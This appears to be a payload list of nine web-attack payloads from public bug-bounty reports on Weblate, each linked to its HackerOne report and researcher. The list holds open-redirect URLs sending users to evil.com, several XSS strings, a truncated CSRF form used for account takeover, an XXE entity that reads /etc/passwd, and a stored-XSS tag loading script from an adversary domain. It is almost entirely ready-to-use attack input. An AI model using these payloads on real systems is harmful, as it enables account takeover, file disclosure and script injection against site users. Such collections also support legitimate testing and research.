# Weblate

9 payloads.

### `0656b5c1`

```
https://target.com/accounts/login/github/?next=///evil.com
```

**Parameter:** `next`
— [Open Redirect via "next" parameter in third-party authentication](https://hackerone.com/reports/223326) · Weblate · [ysx](https://hackerone.com/ysx)

### `cab5d6d0`

```
javascript:confirm(document.domain)
```

— [\[target.com\] Stored Self-XSS via Editor Link in Profile](https://hackerone.com/reports/223331) · Weblate · [ysx](https://hackerone.com/ysx)

### `e70e7e61`

```
https://target.com/accounts/login/facebook/?next=///evil.com
```

**Parameter:** `next`
— [Open redirect in Signing in via Social Sites](https://hackerone.com/reports/223718) · Weblate · [rajauzairabdullah](https://hackerone.com/rajauzairabdullah)

### `6b285bed`

```
https://target.com/accounts/login/bitbucket/?next=///evil.com
```

**Parameter:** `next`
— [Open redirect in Signing in via Social Sites](https://hackerone.com/reports/223718) · Weblate · [rajauzairabdullah](https://hackerone.com/rajauzairabdullah)

### `65f995b3`

```
https://target.com/accounts/login/gitlab/?next=///evil.com
```

**Parameter:** `next`
— [Open redirect in Signing in via Social Sites](https://hackerone.com/reports/223718) · Weblate · [rajauzairabdullah](https://hackerone.com/rajauzairabdullah)

### `e116a121`

```
<html>
  <body>
    <form action="https://target.com/accounts/complete/ubuntu/?janrain_nonce=2017-05-02T19%3A42%3A15ZmPYI5n" method="POST">
      <input type="hidden" name="openid&#46;usernamesecret" value="" />
      <input type="hidden" name="openid&#46;response&#95;nonce" value="2017&#45;05&#45;02T19&#58;45&#58;57ZW2aGkl" />
      <input type="hidden" name="openid&#46;ax&#46;count&#46;old&#95;email" value="0" />
      <input type="hidden" name="openid&#46;ax&#46;type&#46;email" value="h
```

— [Account Takeover using Third party Auth CSRF](https://hackerone.com/reports/225653) · Weblate · [ansariosama](https://hackerone.com/ansariosama)

### `d6bfe4af`

```
%(branch)s:alert(1);//https://
```

— [Self-XSS can be achieved in the editor link using filter bypass](https://hackerone.com/reports/229735) · Weblate · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `0adde1f8`

```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```

— [Uploaded XLF files result in External Entity Execution](https://hackerone.com/reports/232614) · Weblate · [4cad](https://hackerone.com/4cad)

### `7b786962`

```
<script src="http://<adversery_domain>/payload.js"></script>
```

**Parameter:** `project name`
— [Stored XSS @ /engage/<project_slug>](https://hackerone.com/reports/472391) · Weblate · [lgian](https://hackerone.com/lgian)
